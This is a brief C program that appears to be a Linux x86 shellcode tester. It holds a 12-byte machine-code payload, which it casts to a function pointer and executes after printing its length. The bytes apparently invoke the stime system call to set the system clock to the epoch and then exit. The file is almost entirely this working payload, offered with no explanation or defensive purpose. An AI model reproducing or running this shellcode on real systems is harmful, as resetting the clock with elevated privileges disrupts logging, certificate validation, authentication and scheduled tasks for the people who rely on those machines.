#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"
;
main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
   	int (*ret)() = (int(*)())code;
   	ret();
}
